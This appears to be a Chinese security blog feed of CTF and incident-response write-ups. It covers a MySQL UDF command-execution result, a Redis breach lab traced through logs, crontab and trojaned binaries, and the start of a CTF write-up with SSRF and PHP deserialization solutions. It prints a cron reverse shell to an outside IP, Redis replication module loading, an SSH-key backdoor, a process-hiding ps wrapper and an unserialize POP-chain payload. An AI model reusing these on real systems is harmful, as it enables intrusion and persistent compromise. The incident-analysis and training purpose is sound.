+----------+-----+-------------+----------+
<span class="token operator">|</span> name     <span class="token operator">|</span> ret <span class="token operator">|</span> dl          <span class="token operator">|</span> <span class="token builtin class-name">type</span>     <span class="token operator">|</span>
+----------+-----+-------------+----------+
<span class="token operator">|</span> sys_eval <span class="token operator">|</span>   <span class="token number">0</span> <span class="token operator">|</span> mysqludf.so <span class="token operator">|</span> <span class="token keyword">function</span> <span class="token operator">|</span>
+----------+-----+-------------+----------+
<span class="token number">1</span> row <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

MariaDB <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+--------------------+
<span class="token operator">|</span> sys_eval<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span> <span class="token operator">|</span>
+--------------------+
<span class="token operator">|</span> mysql
             <span class="token operator">|</span>
+--------------------+
<span class="token number">1</span> row <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.01</span> sec<span class="token punctuation">)</span></code></pre>
<p>权限是mysql<br><strong>flag{mysql}</strong></p>
]]></content>
      <categories>
        <category>玄机应急靶场</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>应急靶场-redis应急</title>
    <url>/posts/4844d267/</url>
    <content><![CDATA[<pre class="language-bash" data-language="bash"><code class="language-bash">服务器账号密码 root xjredis
<span class="token number">1</span>.通过本地 PC SSH到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交<span class="token punctuation">;</span>
<span class="token number">2</span>.通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件,将黑客上传的恶意文件里面的 FLAG 提交<span class="token punctuation">;</span>
<span class="token number">3</span>.通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少,将反弹 shell 的IP 作为 FLAG 提交<span class="token punctuation">;</span>
<span class="token number">4</span>.通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串<span class="token punctuation">(</span>flag<span class="token punctuation">&#123;</span>黑客的用户-关键字符串<span class="token punctuation">&#125;</span> 注关键字符串 xxx-xxx-xxx<span class="token punctuation">)</span>。将用户名和关键字符串作为 FLAG提交
<span class="token number">5</span>.通过本地 PC SSH到服务器并且分析黑客篡改的命令,将黑客篡改的命令里面的关键字符串作为 FLAG 提交<span class="token punctuation">;</span></code></pre>
<h2 id="通过本地-PC-SSH到服务器并且分析黑客攻击成功的-IP-为多少-将黑客-IP-作为-FLAG-提交"><a href="#通过本地-PC-SSH到服务器并且分析黑客攻击成功的-IP-为多少-将黑客-IP-作为-FLAG-提交" class="headerlink" title="通过本地 PC SSH到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交"></a>通过本地 PC SSH到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交</h2><p>就是看redis的日志</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">
root@ip-10-0-10-5:/var/log<span class="token comment"># cat /var/log/redis.log</span>
<span class="token punctuation">..</span>.
<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:33.173 * REPLICAOF <span class="token number">192.168</span>.100.20:8888 enabled <span class="token punctuation">(</span>user request from <span class="token string">'id=6 addr=192.168.200.2:64339 fd=7 name= age=0 idle=0 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=48 qbuf-free=32720 obl=0 oll=0 omem=0 events=r cmd=slaveof'</span><span class="token punctuation">)</span>
<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:33.786 * Connecting to MASTER <span class="token number">192.168</span>.100.20:8888
<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:33.786 * MASTER <span class="token operator">&lt;</span>-<span class="token operator">></span> REPLICA <span class="token function">sync</span> started
<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:33.788 * Non blocking connect <span class="token keyword">for</span> SYNC fired the event.
<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:35.192 * Master replied to PING, replication can continue<span class="token punctuation">..</span>.
<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:35.194 * Trying a partial resynchronization <span class="token punctuation">(</span>request 7a73a1a4297a16c50d8465b0cc432444f0e5df71:1<span class="token punctuation">)</span>.
<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:35.195 * Full resync from master: ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ:1
<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:35.195 * Discarding previously cached master state.
<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:35.195 * MASTER <span class="token operator">&lt;</span>-<span class="token operator">></span> REPLICA sync: receiving <span class="token number">48040</span> bytes from master
<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:35.197 * MASTER <span class="token operator">&lt;</span>-<span class="token operator">></span> REPLICA sync: Flushing old data
<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:35.197 * MASTER <span class="token operator">&lt;</span>-<span class="token operator">></span> REPLICA sync: Loading DB <span class="token keyword">in</span> memory
<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:35.197 <span class="token comment"># Wrong signature trying to load DB from file</span>
<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:35.197 <span class="token comment"># Failed trying to load the MASTER synchronization DB from disk</span>
<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:35.791 * Connecting to MASTER <span class="token number">192.168</span>.100.20:8888
<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:35.791 * MASTER <span class="token operator">&lt;</span>-<span class="token operator">></span> REPLICA <span class="token function">sync</span> started
<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:35.792 * Non blocking connect <span class="token keyword">for</span> SYNC fired the event.
<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:37.205 * Module <span class="token string">'system'</span> loaded from ./exp.so
<span class="token number">419</span>:M <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:37.210 <span class="token comment"># Setting secondary replication ID to 7a73a1a4297a16c50d8465b0cc432444f0e5df71, valid up to offset: 1. New replication ID is 46e68f9593cd148bffe464f0b04bee19ac447c39</span>
<span class="token number">419</span>:M <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:37.210 * MASTER MODE enabled <span class="token punctuation">(</span>user request from <span class="token string">'id=6 addr=192.168.200.2:64339 fd=7 name= age=4 idle=0 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=34 qbuf-free=32734 obl=0 oll=0 omem=0 events=r cmd=slaveof'</span><span class="token punctuation">)</span>
<span class="token punctuation">..</span>.</code></pre>
<p>发现了redis主从复制连接到主服务器的ip 192.168.100.20,所以黑客ip是192.168.100.20<br><strong>flag{192.168.100.20}</strong></p>
<h2 id="通过本地-PC-SSH到服务器并且分析黑客第一次上传的恶意文件-将黑客上传的恶意文件里面的-FLAG-提交"><a href="#通过本地-PC-SSH到服务器并且分析黑客第一次上传的恶意文件-将黑客上传的恶意文件里面的-FLAG-提交" class="headerlink" title="通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件,将黑客上传的恶意文件里面的 FLAG 提交"></a>通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件,将黑客上传的恶意文件里面的 FLAG 提交</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:34:37.205 * Module <span class="token string">'system'</span> loaded from ./exp.so</code></pre>
<p>可以看到从<code>exp.so</code>引入system模块，找一下这个文件,往左边一瞅看到了<br><img src="https://ooo.0x0.ooo/2024/06/13/OJuJpP.png" alt="OJuJpP.png" loading="lazy"><br>反编译看看<br>找到flag<br><img src="https://ooo.0x0.ooo/2024/06/13/OJuPfb.png" alt="OJuPfb.png" loading="lazy"><br><strong>flag{XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b}</strong></p>
<h2 id="通过本地-PC-SSH到服务器并且分析黑客反弹-shell-的IP-为多少-将反弹-shell-的IP-作为-FLAG-提交"><a href="#通过本地-PC-SSH到服务器并且分析黑客反弹-shell-的IP-为多少-将反弹-shell-的IP-作为-FLAG-提交" class="headerlink" title="通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少,将反弹 shell 的IP 作为 FLAG 提交"></a>通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少,将反弹 shell 的IP 作为 FLAG 提交</h2><pre class="language-bash" data-language="bash"><code class="language-bash">ys/kernel/mm/transparent_hugepage/enabled<span class="token string">' as root, and add it to your /etc/rc.local in order to retain the setting after a reboot. Redis must be restarted after THP is disabled.
419:M 31 Jul 2023 05:25:31.525 * Ready to accept connections
419:S 31 Jul 2023 05:33:15.065 * Before turning into a replica, using my master parameters to synthesize a cached master: I may be able to synchronize with the new master with just a partial transfer.
419:S 31 Jul 2023 05:33:15.065 * REPLICAOF 192.168.100.13:8888 enabled (user request from '</span>id<span class="token operator">=</span><span class="token number">3</span> <span class="token assign-left variable">addr</span><span class="token operator">=</span><span class="token number">192.168</span>.200.2:64289 <span class="token assign-left variable">fd</span><span class="token operator">=</span><span class="token number">7</span> <span class="token assign-left variable">name</span><span class="token operator">=</span> <span class="token assign-left variable">age</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">idle</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">flags</span><span class="token operator">=</span>N <span class="token assign-left variable">db</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">sub</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">psub</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">multi</span><span class="token operator">=</span>-1 <span class="token assign-left variable">qbuf</span><span class="token operator">=</span><span class="token number">48</span> qbuf-free<span class="token operator">=</span><span class="token number">32720</span> <span class="token assign-left variable">obl</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">oll</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">omem</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">events</span><span class="token operator">=</span>r <span class="token assign-left variable">cmd</span><span class="token operator">=</span>slaveof'<span class="token punctuation">)</span>
<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:33:15.610 * Connecting to MASTER <span class="token number">192.168</span>.100.13:8888
<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:33:15.610 * MASTER <span class="token operator">&lt;</span>-<span class="token operator">></span> REPLICA <span class="token function">sync</span> started
<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:33:15.611 <span class="token comment"># Error condition on socket for SYNC: Connection refused</span>
<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:33:16.612 * Connecting to MASTER <span class="token number">192.168</span>.100.13:8888
<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:33:16.612 * MASTER <span class="token operator">&lt;</span>-<span class="token operator">></span> REPLICA <span class="token function">sync</span> started
<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:33:16.613 <span class="token comment"># Error condition on socket for SYNC: Connection refused</span>
<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:33:17.614 * Connecting to MASTER <span class="token number">192.168</span>.100.13:8888
<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:33:17.614 * MASTER <span class="token operator">&lt;</span>-<span class="token operator">></span> REPLICA <span class="token function">sync</span> started
<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:33:17.615 <span class="token comment"># Error condition on socket for SYNC: Connection refused</span>
<span class="token number">419</span>:S <span class="token number">31</span> Jul <span class="token number">2023</span> 05:33:18.616 * Connecting to MASTER <span class="token number">192.168</span>.100.13:8888</code></pre>
<p>日志里面这个ip<code> 192.168.100.13</code>好多<br>看一眼定时任务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@ip-10-0-10-5:/var/log<span class="token comment"># crontab -l</span>
<span class="token comment"># Edit this file to introduce tasks to be run by cron.</span>
<span class="token comment">#</span>
<span class="token comment"># Each task to run has to be defined through a single line</span>
<span class="token comment"># indicating with different fields when the task will be run</span>
<span class="token comment"># and what command to run for the task</span>
<span class="token comment">#</span>
<span class="token comment"># To define the time you can provide concrete values for</span>
<span class="token comment"># minute (m), hour (h), day of month (dom), month (mon),</span>
<span class="token comment"># and day of week (dow) or use '*' in these fields (for 'any').</span>
<span class="token comment">#</span>
<span class="token comment"># Notice that tasks will be started based on the cron's system</span>
<span class="token comment"># daemon's notion of time and timezones.</span>
<span class="token comment">#</span>
<span class="token comment"># Output of the crontab jobs (including errors) is sent through</span>
<span class="token comment"># email to the user the crontab file belongs to (unless redirected).</span>
<span class="token comment">#</span>
<span class="token comment"># For example, you can run a backup of all your user accounts</span>
<span class="token comment"># at 5 a.m every week with:</span>
<span class="token comment"># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span>
<span class="token comment">#</span>
<span class="token comment"># For more information see the manual pages of crontab(5) and cron(8)</span>
<span class="token comment">#</span>
*/1 * * * *  /bin/sh <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span> /dev/tcp/192.168.100.13/7777 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span>
<span class="token comment"># m h  dom mon dow   command</span></code></pre>
<p>发现就是这个ip反弹shell<br><strong>flag{192.168.100.13}</strong></p>
<h2 id="通过本地-PC-SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串-flag-黑客的用户-关键字符串-注关键字符串-xxx-xxx-xxx-。将用户名和关键字符串作为-FLAG提交"><a href="#通过本地-PC-SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串-flag-黑客的用户-关键字符串-注关键字符串-xxx-xxx-xxx-。将用户名和关键字符串作为-FLAG提交" class="headerlink" title="通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag{黑客的用户-关键字符串} 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交"></a>通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag{黑客的用户-关键字符串} 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交</h2><p>看一下黑客写入的公钥</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">
root@ip-10-0-10-5:~/.ssh<span class="token comment"># cat authorized_keys</span>
REDIS0009▒      redis-ver5.0.1▒
▒edis-bits▒@▒ctime▒tO▒dused-mem▒XU
aof-preamble▒▒▒xxsshB9
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDh4OEFvyb4ubM7YPvzG/FfO6jE4PjLdmuCUdGP+aeLeJB5SXYT6zHkU9wlfY/Fo4UuBlhTqBaS6Ih/Wf62KepzrMsTQQYcSG/Xp8lgFzVCCFAk7apzxfRCPNk1pxaGiEF6MPoCmUu1UhC3ta3xyh2c4KZls0hyFN9JZsuD+siT8KVqm856vQ+RaTrZi3ThMa5gbeH+v3ZUcO35ZfMKor/uWXffHT0Yi06dsgIMN3faIiBrd1Lg0B5kOTaDq3fHs8Qs7pvR9C4ZTm2AK/Oct8ULdsnfS2YWtrYyC8rzNip9Wf083ZY1B4bj1UoxD+QwgThh5VP3xgRd9KDSzEYIBabstGh8GU5zDxr0zIuhQM35I0aALvojXl4QaaEnZwpqU3ZkojPG2aNC0QdiBK7eKwA38Gk+V8DEWc/TTkO+wm3aXYdll5sPmoWTAonaln1nmCiTDn4jKb73DxYHfSgNIDpJ6fS5kbWL5UJnElWCrxzaXKHUlqXJj3x81Oz6baFNv8<span class="token operator">=</span> xj-test-user</code></pre>
<p>黑客用户<code>xj-test-user</code><br>在git上搜到该用户下的redis工具<br><img src="https://ooo.0x0.ooo/2024/06/13/OJu4Kg.png" alt="OJu4Kg.png" loading="lazy"><br><strong>flag{xj-test-user-wow-you-find-flag}</strong></p>
<h2 id="通过本地-PC-SSH到服务器并且分析黑客篡改的命令-将黑客篡改的命令里面的关键字符串作为-FLAG-提交"><a href="#通过本地-PC-SSH到服务器并且分析黑客篡改的命令-将黑客篡改的命令里面的关键字符串作为-FLAG-提交" class="headerlink" title="通过本地 PC SSH到服务器并且分析黑客篡改的命令,将黑客篡改的命令里面的关键字符串作为 FLAG 提交"></a>通过本地 PC SSH到服务器并且分析黑客篡改的命令,将黑客篡改的命令里面的关键字符串作为 FLAG 提交</h2><p>去&#x2F;usr&#x2F;bin目录下看</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@ip-10-0-10-5:/usr/bin<span class="token comment">#ls -ltr</span>
<span class="token punctuation">..</span>
-rwxr-xr-x <span class="token number">1</span> root root    <span class="token number">14663096</span> Jun <span class="token number">29</span>  <span class="token number">2023</span>  amazon-ssm-agent
lrwxrwxrwx <span class="token number">1</span> root root          <span class="token number">20</span> Jul <span class="token number">31</span>  <span class="token number">2023</span>  cc -<span class="token operator">></span> /etc/alternatives/cc
lrwxrwxrwx <span class="token number">1</span> root root          <span class="token number">21</span> Jul <span class="token number">31</span>  <span class="token number">2023</span>  c89 -<span class="token operator">></span> /etc/alternatives/c89
lrwxrwxrwx <span class="token number">1</span> root root          <span class="token number">21</span> Jul <span class="token number">31</span>  <span class="token number">2023</span>  c99 -<span class="token operator">></span> /etc/alternatives/c99
lrwxrwxrwx <span class="token number">1</span> root root          <span class="token number">26</span> Jul <span class="token number">31</span>  <span class="token number">2023</span>  automake -<span class="token operator">></span> /etc/alternatives/automake
lrwxrwxrwx <span class="token number">1</span> root root          <span class="token number">25</span> Jul <span class="token number">31</span>  <span class="token number">2023</span>  aclocal -<span class="token operator">></span> /etc/alternatives/aclocal
-rwxr-xr-x <span class="token number">1</span> root root      <span class="token number">133432</span> Jul <span class="token number">31</span>  <span class="token number">2023</span>  ps_
<span class="token parameter variable">-rwxrwxrwx</span> <span class="token number">1</span> root root         <span class="token number">178</span> Jul <span class="token number">31</span>  <span class="token number">2023</span>  <span class="token function">ps</span></code></pre>
<p>可以看到一个叫<code>ps_</code>的很奇怪，不过从ps下拿到了flag</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@ip-10-0-10-5:/usr/bin<span class="token comment"># cat ps</span>
<span class="token comment">#/bin/bash</span>
<span class="token assign-left variable">oldifs</span><span class="token operator">=</span><span class="token string">"<span class="token environment constant">$IFS</span>"</span>
<span class="token assign-left variable"><span class="token environment constant">IFS</span></span><span class="token operator">=</span><span class="token string">'\$n'</span>
<span class="token assign-left variable">result</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>ps_ $1 $2 $3<span class="token operator">|</span><span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">'threadd'</span> <span class="token variable">)</span></span>
<span class="token keyword">for</span> <span class="token for-or-select variable">v</span> <span class="token keyword">in</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
<span class="token keyword">do</span>
        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token variable">$v</span><span class="token entity" title="\t">\t</span>"</span><span class="token punctuation">;</span>
<span class="token keyword">done</span>
<span class="token assign-left variable"><span class="token environment constant">IFS</span></span><span class="token operator">=</span><span class="token string">"<span class="token variable">$oldifs</span>"</span>
<span class="token comment">#//c195i2923381905517d818e313792d196</span></code></pre>
<p><strong>flag{c195i2923381905517d818e313792d196}</strong></p>
]]></content>
      <categories>
        <category>玄机应急靶场</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>第一届&quot;帕鲁杯&quot;wp</title>
    <url>/posts/f79382a3/</url>
    <content><![CDATA[<p>刚刚玩完第一届帕鲁杯，跟几位师傅一起打的比赛，个人也是第一次参加应急响应的比赛，感觉挺有意思，记录一下.(以下wp包含复现内容)<br>先是几道ctf题</p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Web-签到"><a href="#Web-签到" class="headerlink" title="Web-签到"></a>Web-签到</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify
<span class="token keyword">import</span> requests
<span class="token keyword">from</span> flag <span class="token keyword">import</span> flag  <span class="token comment"># 假设从 flag.py 文件中导入了 flag 函数</span>
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">getinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> url<span class="token punctuation">:</span>
        <span class="token comment"># 请求url</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
        content <span class="token operator">=</span> response<span class="token punctuation">.</span>text
        <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"paluctf"</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>
            <span class="token keyword">return</span> flag
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> content
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token number">200</span><span class="token punctuation">,</span>  <span class="token comment"># 这里是数值，不是字符串</span>
            <span class="token string">'data'</span><span class="token punctuation">:</span> <span class="token string">"Come sign in and get the flag!"</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span>response<span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">flag1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">"paluctf"</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span></code></pre>
<p>在&#x2F;路由里面,会进行一个get请求，如果响应包里面包含<code>paluctf</code>就会返回flag，正好<code>/flag</code>路由回返回<code>paluctf</code>字符串，那么直接<code>url=http://localhost/flag</code>拿到flag<br><img src="https://ooo.0x0.ooo/2024/04/22/Op1eAt.png" alt="Op1eAt.png" loading="lazy"></p>
<h2 id="R23"><a href="#R23" class="headerlink" title="R23"></a>R23</h2><p><img src="https://ooo.0x0.ooo/2024/04/22/Op1rSx.png" alt="Op1rSx.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>?php
show_source<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span>
class a<span class="token punctuation">&#123;</span>
    public <span class="token keyword">function</span> __get<span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span>-<span class="token operator">></span>b-<span class="token operator">></span>love<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

class b<span class="token punctuation">&#123;</span>
    public <span class="token keyword">function</span> <span class="token function-name function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token variable">$this</span>-<span class="token operator">></span>c-<span class="token operator">></span>name<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    public <span class="token keyword">function</span> <span class="token function-name function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span>-<span class="token operator">></span>c <span class="token operator">=</span> <span class="token string">"no!"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span>-<span class="token operator">></span>b <span class="token operator">=</span> <span class="token variable">$this</span>-<span class="token operator">></span>a<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

class xk<span class="token punctuation">&#123;</span>
    public <span class="token keyword">function</span> <span class="token function-name function">love</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
       system<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

if<span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/R:2|R:3/'</span>,<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token punctuation">&#123;</span>
    die<span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
unserialize<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre>
<p>入口一看就是b类,__wakeup-&gt;__destruct-&gt;__get-&gt;love<br>所以初步构造是</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$s</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$s</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$s</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">;</span>
<span class="token variable">$s</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$s</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token property">b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">xk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//O:1:"b":3:&#123;s:1:"b";N;s:1:"c";R:2;s:1:"a";O:1:"a":1:&#123;s:1:"b";O:2:"xk":0:&#123;&#125;&#125;&#125;</span></code></pre>
<p>但是题目不能出现R:2，发现套个数组并且加个无用数据会变成R:4</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$s</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$s</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$s</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">;</span>
<span class="token variable">$s</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$s</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token property">b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">xk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$t</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
